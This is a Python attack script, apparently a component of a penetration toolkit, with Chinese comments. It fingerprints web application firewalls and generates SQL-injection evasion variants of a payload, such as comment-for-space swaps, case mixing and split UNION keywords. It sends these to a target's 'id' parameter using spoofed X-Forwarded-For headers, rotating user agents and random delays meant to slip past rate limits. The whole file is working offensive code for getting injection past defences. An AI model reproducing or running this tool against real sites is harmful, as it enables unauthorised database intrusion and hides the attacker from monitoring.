#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import random
import time
import json
from typing import Dict, Any, List
from rich.console import Console
from fake_useragent import UserAgent

console = Console()

class WAFBypass:
    def __init__(self):
        self.ua = UserAgent()
        self.results: Dict[str, Any] = {}
        
        # WAF指纹特征
        self.waf_signatures = {
            'cloudflare': [
                'cf-ray',
                '__cfduid',
                'cf-cache-status'
            ],
            'akamai': [
                'akamai-gtm',
                'aka-debug'
            ],
            'f5': [
                'TS',
                'F5-TrafficShield'
            ]
        }
    
    def detect_waf(self, url: str) -> Dict[str, Any]:
        """检测目标是否使用WAF及类型"""
        try:
            headers = {'User-Agent': self.ua.random}
            response = requests.get(url, headers=headers, verify=False, timeout=10)
            
            detected_wafs = []
            
            # 检查响应头
            for waf_name, signatures in self.waf_signatures.items():
                for signature in signatures:
                    if signature.lower() in str(response.headers).lower():
                        detected_wafs.append(waf_name)
                        break
            
            # 检查响应内容中的特征
            content = response.text.lower()
            if 'waf' in content or 'firewall' in content:
                detected_wafs.append('generic_waf')
            
            self.results['waf_detection'] = {
                'detected': len(detected_wafs) > 0,
                'waf_types': list(set(detected_wafs))
            }
            
            return self.results['waf_detection']
            
        except Exception as e:
            console.print(f"[red]WAF检测失败: {str(e)}[/red]")
            return {'detected': False, 'waf_types': []}
    
    def generate_bypass_payloads(self, original_payload: str, waf_type: str = None) -> List[str]:
        """生成WAF绕过payload"""
        payloads = [
            original_payload.replace(' ', '/**/'),  # 注释符替换空格
            original_payload.replace('SELECT', 'SeLeCt'),  # 大小写混淆
            original_payload.replace('AND', '&&'),  # 逻辑运算符替换
            original_payload.replace('OR', '||'),
            original_payload + '-- -'  # 注释符变体
        ]
        
        # WAF特定绕过技术
        if waf_type == 'cloudflare':
            payloads.extend([
                original_payload.replace('=', ' LIKE '),
                original_payload.replace('UNION', 'UN/**/ION')
            ])
        elif waf_type == 'akamai':
            payloads.extend([
                original_payload.replace('\'', '\\\''),
                original_payload.replace('"', '\\"')
            ])
        
        return list(set(payloads))  # 去重
    
    def test_bypass(self, url: str, payloads: List[str]) -> Dict[str, Any]:
        """测试绕过payload的有效性"""
        results = {
            'successful_payloads': [],
            'failed_payloads': []
        }
        
        for payload in payloads:
            try:
                # 随机延迟，避免触发频率限制
                time.sleep(random.uniform(1, 3))
                
                # 构造请求
                headers = {
                    'User-Agent': self.ua.random,
                    'X-Forwarded-For': f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                
                response = requests.get(
                    url,
                    params={'id': payload},
                    headers=headers,
                    verify=False,
                    timeout=10
                )
                
                # 检查响应
                if response.status_code == 200 and 'blocked' not in response.text.lower():
                    results['successful_payloads'].append({
                        'payload': payload,
                        'status_code': response.status_code
                    })
                else:
                    results['failed_payloads'].append({
                        'payload': payload,
                        'status_code': response.status_code
                    })
                    
            except Exception as e:
                console.print(f"[yellow]Payload测试失败: {payload} - {str(e)}[/yellow]")
                results['failed_payloads'].append({
                    'payload': payload,
                    'error': str(e)
                })
        
        self.results['bypass_tests'] = results
        return results
    
    def get_effective_payloads(self) -> List[str]:
        """获取有效的绕过payload"""
        if 'bypass_tests' in self.results:
            return [p['payload'] for p in self.results['bypass_tests']['successful_payloads']]
        return []
    
    def export_results(self, filepath: str) -> None:
        """导出绕过测试结果"""
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=4)
            console.print(f"[green]WAF绕过结果已保存到: {filepath}[/green]")
        except Exception as e:
            console.print(f"[red]导出结果失败: {str(e)}[/red]") 